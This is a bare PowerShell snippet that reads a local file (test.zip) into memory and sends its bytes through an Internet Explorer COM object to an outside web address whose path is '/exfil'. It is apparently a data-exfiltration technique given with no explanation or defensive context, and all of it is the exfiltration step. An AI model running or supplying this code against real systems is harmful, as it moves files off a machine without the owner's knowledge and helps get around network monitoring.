$ieObject = New-Object -ComObject 'InternetExplorer.Application';
$f = [System.IO.File]::ReadAllBytes('.\test.zip');
$ieObject.navigate("http://loudounschools.org/exfil", $null, $null, $f);
